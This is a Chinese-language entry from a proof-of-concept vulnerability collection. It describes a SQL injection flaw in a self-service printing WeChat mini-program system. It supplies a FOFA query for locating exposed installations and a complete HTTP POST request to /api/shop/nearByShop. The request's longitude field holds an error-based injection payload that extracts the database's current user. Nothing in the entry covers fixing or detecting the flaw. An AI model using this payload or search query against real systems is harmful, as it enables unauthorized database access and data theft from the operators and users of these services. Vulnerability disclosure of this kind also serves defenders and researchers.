---
source: "wy876 漏洞文库"
---

# 自助打印微信小程序系统存在SQL注入漏洞

# 一、漏洞简介
微数字化时代，打印服务的需求与日俱增。为了满足用户的便利需求，全新UI的自助打印系统/云打印小程序。全新UI设计：采用2024年最新的UI设计风格，界面简洁美观，用户体验极佳。云打印功能：支持用户通过小程序上传文件并进行云端打印，方便快捷。自助服务：用户可以自主选择打印参数，如打印份数、纸张类型等，实现真正的自助打印。多平台支持：源码支持微信小程序平台，方便用户在移动端进行操作。自助打印微信小程序系统存在SQL注入漏洞

# 二、影响版本
+ 自助打印微信小程序系统

# 三、资产测绘
+ fofa`"未登录" && "/admin/login/index.html"`
+ 特征


# 四、漏洞复现
```java
POST /api/shop/nearByShop HTTP/1.1
Host: 
Content-Length: 104
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

latitude=1&longitude=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,190))),9392)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/plik2eccznoh6366>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
